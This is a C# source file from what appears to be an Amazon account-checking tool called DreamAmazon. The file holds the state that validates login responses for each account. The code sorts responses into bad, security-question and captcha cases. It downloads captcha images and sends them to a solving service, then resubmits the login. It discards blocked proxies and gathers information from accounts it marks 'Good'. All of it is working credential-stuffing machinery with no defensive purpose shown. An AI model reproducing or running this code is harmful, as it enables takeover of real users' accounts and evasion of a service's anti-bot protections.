using System;
using System.Collections.Generic;
using System.Net;
using System.Text.RegularExpressions;

namespace DreamAmazon
{
    public class ValidationState : CheckState
    {
        private readonly Regex _attributesRegex = new Regex(Globals.REGEX, RegexOptions.Multiline | RegexOptions.IgnoreCase);
        private Result<string> _response;

        public ValidationState(StateContext context) : base(context)
        {
        }

        public void Init(Result<string> response)
        {
            _response = response;
        }

        private const int CountersLimit = 3;

        private int _captchaCounter;
        private int _notDbcModeCounter;

        public override void Handle(NetHelper nHelper)
        {
            if (_response.Failure)
            {
                Context.SetFinishState();
                return;
            }

            var account = Context.CheckParams.Account;
            var proxyManager = Context.ProxyManager;

            if (StateContext.IsBadLog(_response.Value))
            {
                Context.Logger.Debug("bad log detected:" + account.Email);
                Context.FireOnCheckCompleted(Context, CheckResults.Bad, Context.CheckParams);
            }
            else if (StateContext.IsSecurityQuestion(_response.Value))
            {
                Context.Logger.Debug("security question detected:" + account.Email);
                nHelper.GET("http://amazon.com/homepage=true");
                Context.GatherInformation(nHelper, account);

                Context.FireOnCheckCompleted(Context, CheckResults.Good, Context.CheckParams);
            }
            else if (StateContext.IsCookiesDisabled(_response.Value))
            {
                Context.Logger.Debug("cookies disabled, restart state object" + account.Email);
                Context.SetRestartState();
                return;
            }
            else if (StateContext.IsCaptchaMsg(_response.Value))
            {
                if (Properties.Settings.Default.Mode == 0 || Properties.Settings.Default.Mode == 1)
                {
                    if (Context.IsDebug)
                    {
                        Context.Debug(_response.Value);
                    }

                    var captchaUrlResult = GetCaptchaUrl(_response.Value);

                    if (captchaUrlResult.Failure)
                    {
                        var msg = "invalid url response:" + account.Email + " , " + captchaUrlResult.Error + " , " +
                                  _response.Value;
                        if (Context.IsDebug)
                        {
                            Context.Debug(msg);
                        }
                        Context.Logger.Debug(msg);
                        Context.SetFinishState();
                        return;
                    }

                    var urlPaths = _response.Value.Split(new[] {"opfcaptcha-prod.s3.amazonaws.com"},
                        StringSplitOptions.None);

                    if (urlPaths.Length < 2)
                    {
                        Context.Logger.Debug("invalid url response:" + account.Email + " , " + _response.Value);
                        Context.SetFinishState();
                        return;
                    }

                    string captchaUrl = "https://opfcaptcha-prod.s3.amazonaws.com" + urlPaths[1].Split('"')[0];
                    byte[] captchaBytes;

                    using (WebClient wc = new WebClient())
                        captchaBytes = wc.DownloadData(captchaUrl);

                    var captchaResult = Context.CaptchaService.DecodeCaptchaAsync(captchaBytes).Result;

                    if (captchaResult != null)
                    {
                        var metadata = Context.MetadataFinder.QueryMetadata(Context.CheckParams.Account);

                        Contracts.Require(metadata != null);

                        var attributes = StateContext.ParseAccountAttributes(account, metadata);

                        foreach (Match m in _attributesRegex.Matches(_response.Value))
                        {
                            if (m.Groups.Count < CountersLimit)
                                continue;

                            attributes.Add(m.Groups[1].ToString(), m.Groups[2].ToString());
                        }

                        attributes.Add("guess", captchaResult.Text);

                        var response = nHelper.POST(Globals.POST_URL, attributes);
                        Init(response);

                        // limit captcha attemts
                        if (_captchaCounter >= CountersLimit)
                        {
                            Context.Logger.Debug("captcha decoded, counter reached, finish state object:" + account.Email);
                            Context.SetFinishState();
                            Context.FireOnCheckCompleted(Context, CheckResults.Bad, Context.CheckParams);
                            return;
                        }

                        _captchaCounter++;

                        Context.Logger.Debug("captcha decoded, repeat current state object:" + account.Email);
                        return;
                    }
                    //todo: captcha not recognized, so need to request new one
                    Context.Logger.Debug("captcha not recognized, finish state object:" + account.Email);
                }
                else
                {
                    if (_notDbcModeCounter >= CountersLimit)
                    {
                        Context.Logger.Debug("not dbc mode, counter reached, finish state object:" + account.Email);
                        Context.SetFinishState();
                        Context.FireOnCheckCompleted(Context, CheckResults.Bad, Context.CheckParams);
                        return;
                    }

                    proxyManager.RemoveProxy(nHelper.Proxy);
                    Context.SetRestartState();

                    _notDbcModeCounter++;
                    Context.Logger.Debug("not dbc mode, restart state object:" + account.Email);

                    return;
                }
            }
            else if (StateContext.IsAskCredentials(_response.Value))
            {
                Context.Logger.Debug("ask credentials, restart state object:" + account.Email);
            }
            else if (StateContext.IsAnotherDevice(_response.Value))
            {
                Context.Logger.Debug("is another device answer detected:" + account.Email);
                Context.FireOnCheckCompleted(Context, CheckResults.Good, Context.CheckParams);
            }
            else if (StateContext.IsError(_response))
            {
                Context.Logger.Debug("error detected, restart state object:" + account.Email);
                proxyManager.RemoveProxy(nHelper.Proxy);
                Context.SetRestartState();
                return;
            }
            else
            {
                Context.Logger.Debug("gather information:" + account.Email);
                Context.GatherInformation(nHelper, account);
                Context.FireOnCheckCompleted(Context, CheckResults.Good, Context.CheckParams);
            }

            Context.SetFinishState();
        }

        private static Result<string> GetCaptchaUrl(string response)
        {
            foreach (var sRegex in GetCaptchaUrlRegex())
            {
                if (!Regex.IsMatch(response, sRegex))
                    continue;

                //var matches = Regex.Matches(response, sRegex);
                //if (matches.Count > 1)
                //{}

                var match = Regex.Match(response, sRegex);
                return Result.Ok(match.Value);
            }
            return Result.Fail<string>("can't find captcha image");
        }

        private static IEnumerable<string> GetCaptchaUrlRegex()
        {
            yield return "\"http.+captcha.+\\.jpg[^\"]*\"";
        }
    }
}